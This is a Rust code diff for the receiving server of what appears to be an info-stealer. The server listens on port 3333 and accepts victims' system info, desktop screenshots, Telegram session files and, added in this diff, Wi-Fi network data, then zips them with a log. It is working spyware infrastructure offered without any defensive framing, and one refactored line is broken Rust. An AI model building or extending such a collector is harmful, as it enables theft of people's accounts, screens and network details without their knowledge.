@@ -1,3 +1,6 @@
+#[allow(dead_code)]
+
+
 pub mod time_md
 {
 	// PACKAGES
@@ -14,11 +17,14 @@ pub mod time_md
 
 	fn get_date() -> String
 	{
-		let foo = if cfg!(target_os = "windows") {
+		let foo = if cfg!(target_os = "windows")
+		{
 			Command::new("cmd")
 				.args(["/C", "DATE /t"])
 				.output().expect("failed to execute process")
-		} else {
+		}
+		else
+		{
 			Command::new("sh")
 				.args(["-c", "date +'%e.%m.%Y'"])
 				.output().expect("failed to execute process")
@@ -34,11 +40,14 @@ pub mod time_md
 
 	fn get_time() -> String
 	{
-		let foo = if cfg!(target_os = "windows") {
+		let foo = if cfg!(target_os = "windows")
+		{
 			Command::new("cmd")
 				.args(["/C", "TIME /t"])
 				.output().expect("failed to execute process")
-		} else {
+		}
+		else
+		{
 			Command::new("sh")
 				.args(["-c", "date +'%H.%M.%S'"])
 				.output().expect("failed to execute process")
@@ -51,10 +60,8 @@ pub mod time_md
 		new_str
 	}
 
-	pub fn start() -> [String; 2] {
-		let res: [String; 2] = [get_date(), get_time()];
-		return res;
-	}
+	pub fn start() -> [String; 2]
+		{ return [String; 2] = [get_date(), get_time()]; }
 }
 
 pub mod log_md
@@ -65,12 +72,11 @@ pub mod log_md
 	use std::io::{Read, Write};
 
 
-	fn add_new_line(filename: String, text: String) -> Result<()> {
+	fn add_new_line(filename: String, text: String) -> Result<()>
+	{
 		let mut existing_content = String::new();
 		match OpenOptions::new().read(true).open(&filename) {
-			Ok(mut file) => {
-				file.read_to_string(&mut existing_content)?;
-			}
+			Ok(mut file) => file.read_to_string(&mut existing_content)?,
 			Err(_) => {}
 		}
 
@@ -127,6 +133,15 @@ pub mod zip_md
 			fs::remove_file("sysinfo.txt");
 		}
 
+		//ADDS A WIFI-NETWORKS-INFO TO THE ZIP FOLDER
+		{
+			zip.start_file("wifi-networks-info.txt", options)?;
+			let mut file_content = File::open("wifi-networks-info.txt")?;
+			std::io::copy(&mut file_content, &mut zip)?;
+
+			fs::remove_file("wifi-networks-info.txt");
+		}
+
 		//ADDS A DESKTOP'S SCREENSHOT TO THE ZIP FOLDER
 		{
 			zip.start_file("screen-1.png", options)?;
@@ -148,7 +163,7 @@ pub mod zip_md
 
 		//ADDS A LOG-INFO TO THE ZIP FOLDER
 		{
-			crate::server::log_md::start("zip created".to_string());
+			crate::server::log_md::start("\nzip created".to_string());
 			zip.start_file("log.txt", options)?;
 			let mut file_content = File::open("log.txt")?;
 			std::io::copy(&mut file_content, &mut zip)?;
@@ -167,7 +182,7 @@ pub mod server_md
 {
 	// PACKAGES
 	use std::thread;
-	use std::net::{TcpListener, TcpStream, Shutdown};
+	use std::net::{TcpListener, TcpStream};
 	use std::io::{self, Read, Write};
 	use std::fs::File;
 	use std::path::Path;
@@ -183,7 +198,8 @@ pub mod server_md
 
 
 		match request.lines().next() {
-			Some(line) if line.starts_with("GET /sysinfo") => {
+			Some(line) if line.starts_with("GET /sysinfo") =>
+			{
 				match stream.read(&mut buffer) {
 					Ok(x) =>
 					{
@@ -198,7 +214,8 @@ pub mod server_md
 
 				println!("HTTP/1.1 200 OK");
 			},
-			Some(line) if line.starts_with("GET /screen") => {
+			Some(line) if line.starts_with("GET /screen") =>
+			{
 				let mut buf = Vec::new();
 				let x = stream.read_to_end(&mut buf).expect("FAILED TO READ FROM CLIENT");
 
@@ -209,7 +226,25 @@ pub mod server_md
 				crate::server::log_md::start("#screen".to_string());
 				println!("HTTP/1.1 200 OK");
 			},
-			Some(line) if line.starts_with("GET /session") => {
+			Some(line) if line.starts_with("GET /wifi") =>
+			{
+				let mut buf = Vec::new();
+				match stream.read_to_end(&mut buf) {
+					Ok(x) =>
+					{
+						let resp = String::from_utf8_lossy(&buf[..x]);
+						let mut file = File::create("wifi-networks-info.txt")?;
+						file.write_all(resp.as_bytes())?;
+
+						crate::server::log_md::start("#wifi".to_string());
+					},
+					Err(_) => println!("An error occurred, terminating connection with {}", stream.peer_addr().unwrap()),
+				}
+
+				println!("HTTP/1.1 200 OK");
+			},
+			Some(line) if line.starts_with("GET /session") =>
+			{
 				let mut received_bytes = 0;
 				let path = Path::new("tg-session");
 				if !path.exists() { fs::create_dir(&path)?; }
@@ -238,7 +273,8 @@ pub mod server_md
 		Ok(())
 	}
 
-	pub fn server_fn()
+
+	pub fn start()
 	{
 		let listener = TcpListener::bind("0.0.0.0:3333").unwrap();
 		
@@ -248,14 +284,15 @@ pub mod server_md
 		for stream in listener.incoming()
 		{
 			match stream {
-				Ok(stream) => {
+				Ok(stream) =>
+				{
 					println!("New connection: {}", stream.peer_addr().unwrap());
 					thread::spawn(move|| {
-						crate::server::log_md::start(format!("new connection: {}", stream.peer_addr().unwrap()));
+						crate::server::log_md::start(format!("\nnew connection: {}", stream.peer_addr().unwrap()));
 						handle_client(stream);
 					});
 				}
-				Err(e) => { println!("Error: {}", e); }
+				Err(e) => println!("Error: {}", e),
 			}
 		}
 
